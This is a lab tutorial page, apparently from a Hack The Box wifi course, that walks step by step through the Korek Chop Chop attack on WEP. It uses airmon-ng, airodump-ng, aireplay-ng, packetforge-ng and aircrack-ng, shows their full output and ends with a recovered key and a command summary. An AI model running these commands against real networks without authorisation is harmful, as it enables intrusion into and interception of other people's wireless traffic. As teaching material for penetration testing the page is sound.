---
title: Korek Chop Chop Attack
description: Korek Chop Chop Attack
date: '2026-09-22'
tags: []
published: true
slug: korek-chop-chop-attack
category: wifi
folder: diving-into-wep-attacks
order: 30
---
# Korek Chop Chop Attack

## What is it?

Not every router is vulnerable to the Fragmentation Attack. When that's the case, the **Korek Chop Chop Attack** (also called the "Inverse Arbaugh attack") gives us another way to steal the same 1500-byte PRGA keystream — just through a different technique.

**The core trick:** This attack abuses WEP's built-in error-checking system (the **ICV**, based on CRC32). Routers automatically drop any packet with an invalid ICV. That "drop or accept" behavior is exactly what we exploit.

---

## How It Actually Works

1. Capture a real, valid encrypted packet
2. **Remove the last byte** of that packet
3. **Guess a value** for what that byte should be (starting at 0)
4. Recalculate what the ICV _would_ be if your guess were correct
5. Send this modified packet to the router
6. **Watch the response:**
    - ❌ Packet dropped → wrong guess, try the next number (1, 2, 3...)
    - ✅ Packet accepted → correct guess! You now know that byte's true value
7. Move to the next byte and repeat the whole process

Byte by byte, the entire packet gets decrypted — **without ever needing the WEP key**. And since we're decrypting known ciphertext, we simultaneously recover the keystream (PRGA) used to encrypt it.

Once we have that keystream, we can forge our own packets and run an ARP replay attack — same end goal as the Fragmentation Attack, just a different road to get there.

---

## Step 1: Enable Monitor Mode

```shellsession
iccys@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

Confirm it worked:

```shellsession
iccys@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

---

## Step 2: Start Capturing Traffic

```shellsession
iccys@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP

21:38:45  Created capture file "WEP-01.cap".                                                                                                
 CH  1 ][ Elapsed: 37 mins ][ 2024-08-05 22:15 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 C8:D1:4D:EA:21:A6  -47 100    21573   116394    0   1   11   WEP  WEP         HackTheWifi                                                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 C8:D1:4D:EA:21:A6  7E:8D:FC:DD:D7:2C  -29    1 - 5      0      85
```

Leave this running in one terminal.

📝 **About the `-h` flag:** For the chop chop attack, you generally want to use the MAC address of an already-connected client (as shown above). Omitting `-h` is possible if you can't authenticate/associate, but it's less reliable and more likely to drop packets.

---

## Step 3: Run the Chop Chop Attack (Second Terminal)

```shellsession
iccys@htb[/htb]$ aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
22:09:49  Waiting for beacon frame (BSSID: C8:D1:4D:EA:21:A6) on channel 1

        Size: 100, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  C8:D1:4D:EA:21:A6
          Dest. MAC  =  C8:D1:4D:EA:21:A6
         Source MAC  =  7E:8D:FC:DD:D7:2C

        0x0000:  0841 0201 d8d6 3deb 29d5 7e8d fcdd d72c  .A....=.).~....,
        0x0010:  d8d6 3deb 29d5 3066 daa0 0a00 3cf2 9b22  ..=.).0f....<.."
        0x0020:  140f 1281 b336 3dc3 7697 157a 88d9 2460  .....6=.v..z..$`
        0x0030:  ed13 410b bea6 9b5d ce96 add6 75fb a0f8  ..A....]....u...
        0x0040:  6878 7ea3 d70a 425f 2c14 a71a 2715 75a6  hx~...B_,...'.u.
        0x0050:  b9ee c1d2 4e19 ae2b e93c c9ab fc28 959f  ....N..+.<...(..
        0x0060:  9a1d 597d                                ..Y}

Use this packet ? y

Saving chosen packet in replay_src-0805-220949.cap
```

**What each part means:**

|Part|Meaning|
|---|---|
|`-4`|Korek Chop Chop attack mode|
|`-b`|Target router's MAC address|
|`-h`|Connected client's MAC address to use|

Confirm the packet with `y`, and the byte-by-byte cracking process begins:

```shellsession
Offset   87 ( 0% done) | xor = 13 | pt = 53 |   83 frames written in  1419ms
Offset   86 ( 1% done) | xor = 64 | pt = B8 |   98 frames written in  1660ms
Offset   85 ( 3% done) | xor = 5D | pt = 0C |   80 frames written in  1360ms
Offset   84 ( 5% done) | xor = 64 | pt = F3 |    4 frames written in    67ms
Offset   83 ( 7% done) | xor = 7B | pt = 00 |   65 frames written in  1097ms
Offset   82 ( 9% done) | xor = 21 | pt = 00 |  219 frames written in  3717ms
Offset   81 (11% done) | xor = F0 | pt = 00 |   17 frames written in   286ms
Offset   80 (12% done) | xor = 44 | pt = 00 |  116 frames written in  1966ms
Offset   79 (14% done) | xor = 3C | pt = 8E |   37 frames written in   621ms
Offset   78 (16% done) | xor = 48 | pt = F7 |  190 frames written in  3206ms
Offset   77 (18% done) | xor = 4C | pt = 00 |  232 frames written in  3935ms
Offset   76 (20% done) | xor = B1 | pt = 85 |   56 frames written in   940ms
Offset   75 (22% done) | xor = 0B | pt = 02 |  159 frames written in  2686ms
Offset   74 (24% done) | xor = C0 | pt = 00 |    6 frames written in   102ms
Offset   73 (25% done) | xor = FB | pt = 00 |   60 frames written in  1030ms
Offset   72 (27% done) | xor = 98 | pt = 00 |  186 frames written in  3155ms
Offset   71 (29% done) | xor = 85 | pt = 00 |   95 frames written in  1622ms
Offset   70 (31% done) | xor = DA | pt = 00 |  167 frames written in  2817ms
Offset   69 (33% done) | xor = 0B | pt = 00 |   94 frames written in  1581ms
Offset   68 (35% done) | xor = 6E | pt = 00 |   19 frames written in   323ms
Offset   67 (37% done) | xor = F0 | pt = 00 |  225 frames written in  3800ms
Offset   66 (38% done) | xor = C4 | pt = 00 |  110 frames written in  1855ms
Offset   65 (40% done) | xor = 2B | pt = 00 |   43 frames written in   724ms
Offset   64 (42% done) | xor = 79 | pt = 00 |  116 frames written in  1958ms
Offset   63 (44% done) | xor = F6 | pt = 00 |  216 frames written in  3659ms
Offset   62 (46% done) | xor = A2 | pt = 00 |   39 frames written in   662ms
Offset   61 (48% done) | xor = 46 | pt = 02 |  107 frames written in  1808ms
Offset   60 (50% done) | xor = 0B | pt = FF |   97 frames written in  1639ms
Offset   59 (51% done) | xor = FB | pt = E1 |  125 frames written in  2121ms
Offset   58 (53% done) | xor = AA | pt = C4 |  239 frames written in  4060ms
Offset   57 (55% done) | xor = 05 | pt = 08 |   97 frames written in  1636ms
Offset   56 (57% done) | xor = CB | pt = A7 |  234 frames written in  3966ms
Offset   55 (59% done) | xor = 77 | pt = 7E |  247 frames written in  4179ms
Offset   54 (61% done) | xor = CB | pt = 0C |   17 frames written in   283ms
Offset   53 (62% done) | xor = 5A | pt = 40 |  223 frames written in  3776ms
Offset   52 (64% done) | xor = A4 | pt = 0D |  189 frames written in  3227ms
Offset   51 (66% done) | xor = 67 | pt = 00 |   67 frames written in  1137ms
Offset   50 (68% done) | xor = 11 | pt = 00 |  153 frames written in  2587ms
Offset   49 (70% done) | xor = 53 | pt = 00 |  149 frames written in  2531ms
Offset   48 (72% done) | xor = 69 | pt = 00 |   85 frames written in  1438ms
Offset   47 (74% done) | xor = 19 | pt = 00 |   40 frames written in   674ms
Offset   46 (75% done) | xor = 05 | pt = 00 |  150 frames written in  2535ms
Offset   45 (77% done) | xor = 9C | pt = 80 |   36 frames written in   606ms
Offset   44 (79% done) | xor = 41 | pt = FE |  213 frames written in  3583ms
Offset   43 (81% done) | xor = 32 | pt = FF |  200 frames written in  3381ms
Offset   42 (83% done) | xor = 16 | pt = 3A |  192 frames written in  3257ms
Offset   41 (85% done) | xor = 49 | pt = 08 |  218 frames written in  3717ms
Offset   40 (87% done) | xor = 35 | pt = 00 |  136 frames written in  2316ms

Sent 946 packets, current guess: AE...

The AP appears to drop packets shorter than 40 bytes.
Enabling standard workaround:  IP header re-creation.

Saving plaintext in replay_dec-0805-221220.cap
Saving keystream in replay_dec-0805-221220.xor

Completed in 141s (0.44 bytes/s)
```

🎉 **Done in 141 seconds!** Notice the tool automatically handled a router quirk (dropping short packets) with a built-in workaround. It saved two files:

- `replay_dec-0805-221220.cap` — the actual **decrypted plaintext** of the packet
- `replay_dec-0805-221220.xor` — the stolen **keystream**

---

## Step 4: Inspect the Decrypted Packet

```shellsession
iccys@htb[/htb]$ ls

replay_dec-0805-221220.cap
replay_dec-0805-221220.xor
```

Now check what's inside with tcpdump:

```shellsession
iccys@htb[/htb]$ tcpdump -s 0 -n -e -r replay_dec-0805-221220.cap       

reading from file replay_dec-0805-221220.cap, link-type IEEE802_11 (802.11), snapshot length 65535                                            
22:12:20.091153 BSSID:c8:d1:4d:ea:21:a6 SA:7e:8d:fc:dd:d7:2c DA:c8:d1:4d:ea:21:a6 LLC, dsap SNAP (0xaa) Individual, ssap SNAP (0xaa) Command, 
ctrl 0x03: oui Ethernet (0x000000), ethertype IPv4 (0x0800), length 60: 192.168.1.75.43748 > 192.168.1.1.443: Flags [S], seq 4053382319, win 6
4240, options [mss 1460,sackOK,TS val 4080146584 ecr 0,nop,wscale 7], length 0                                                                
```

💡 **Why does this actually show real IP addresses (unlike the Fragmentation Attack)?** Because chop chop's whole _purpose_ is decrypting the packet byte-by-byte — the `replay_dec` file is genuinely plaintext, not still-encrypted ciphertext. This is different from the Fragmentation Attack's `replay_src` file, which stays encrypted the whole time. So here, tcpdump really can show you the real source/destination IPs: `192.168.1.75` and `192.168.1.1`.

---

## Step 5: Forge a Fake ARP Request

```shellsession
iccys@htb[/htb]$ packetforge-ng -0 -a C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-0805-221220.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap 
```

**What each part means:**

|Part|Meaning|
|---|---|
|`-0`|Build an ARP request|
|`-a`|Router's MAC address|
|`-h`|Client's MAC address|
|`-k`|Router's IP address|
|`-l`|Client's IP address|
|`-y`|The stolen keystream file|
|`-w`|Output filename|

---

## Step 6: Inject the Forged Packet

```shellsession
iccys@htb[/htb]$ aireplay-ng -2 -r forgedarp.cap -h 7E:8D:FC:DD:D7:2C wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C


        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  C8:D1:4D:EA:21:A6
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  7E:8D:FC:DD:D7:2C

        0x0000:  0841 0201 d8d6 3deb 29d5 7e8d fcdd d72c  .A....=.).~....,
        0x0010:  ffff ffff ffff 8001 daa0 0a00 3cf2 9b22  ............<.."
        0x0020:  140f 1287 f637 35ff dc9f 557b b652 d3ae  .....75...U{.R..
        0x0030:  fa97 80e8 7f8f 9a5c 6472 ac6d 44ca 1556  ......\dr.mD..V
        0x0040:  e423 69ca                                .#i.

Use this packet ? y

Saving chosen packet in replay_src-0805-221358.cap
You should also start airodump-ng to capture replies.

Sent 3503 packets...(500 pps)
```

Watch the Frames count climb in your airodump-ng terminal — confirming IVs are being generated.

---

## Step 7 (Optional): Speed It Up with ARP Replay

```shellsession
iccys@htb[/htb]$ aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
22:14:47  Waiting for beacon frame (BSSID: C8:D1:4D:EA:21:A6) on channel 1
Saving ARP requests in replay_arp-0805-221447.cap
You should also start airodump-ng to capture replies.
Read 186176 packets (got 69052 ARP requests and 0 ACKs), sent 26781 packets...(499 pps)
```

---

## Step 8: Crack the WEP Key

```shellsession
iccys@htb[/htb]$ aircrack-ng -b C8:D1:4D:EA:21:A6 WEP-01.cap 

Reading packets, please wait...
Opening WEP-01.cap
Read 251698 packets.

1 potential targets                                     Got 116410 out of 115000 IVs
Starting PTW attack with 116410 ivs.

                         KEY FOUND! [ 33:44:55:22:11 ] 

Attack Decrypted correctly: 100% captured ivs.
```

🎉 **Success!** The WEP key is `33:44:55:22:11`.

---

## Chop Chop vs. Fragmentation: Quick Comparison

||Fragmentation|Chop Chop|
|---|---|---|
|How keystream is obtained|Broadcasting/rebuilding known-plaintext fragments|Byte-by-byte guessing via ICV validation|
|Speed|Usually faster|Can take longer (byte-by-byte process)|
|Real IP addresses visible via tcpdump?|❌ No (packet stays encrypted)|✅ Yes (packet is actually decrypted)|
|When to use|When fragmentation is supported|When fragmentation doesn't work well|

---

## Command Summary

```bash
sudo airmon-ng start wlan0                # Enable monitor mode
iwconfig                                  # Confirm monitor mode is active
airodump-ng wlan0mon -c 1 -w WEP                                              # Capture traffic (Terminal 1)
aireplay-ng -4 -b <BSSID> -h <client MAC> wlan0mon                           # Run the Korek Chop Chop attack
tcpdump -s 0 -n -e -r <replay_dec .cap file>                                  # Inspect the now-decrypted packet
packetforge-ng -0 -a <BSSID> -h <client MAC> -k <router IP> -l <client IP> -y <keystream.xor> -w forgedarp.cap   # Forge a fake ARP request
aireplay-ng -2 -r forgedarp.cap -h <client MAC> wlan0mon                     # Inject the forged packet
aireplay-ng -3 -b <BSSID> -h <client MAC> wlan0mon                          # (Optional) Speed up with ARP replay too
aircrack-ng -b <BSSID> WEP-01.cap                                             # Crack the WEP key
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`-4`|Korek Chop Chop attack mode (aireplay-ng)|
|`-b <BSSID>`|Target router's MAC address|
|`-h <MAC>`|Client MAC address to use/impersonate|
|`-2`|Interactive packet replay mode|
|`-3`|ARP request replay mode|
|`-0`|Build an ARP request (packetforge-ng)|
|`-a`|Router's MAC address (packetforge-ng)|
|`-k`|Router's IP address (packetforge-ng)|
|`-l`|Client's IP address (packetforge-ng)|
|`-y`|The stolen keystream file (packetforge-ng)|
|`-w`|Output filename|
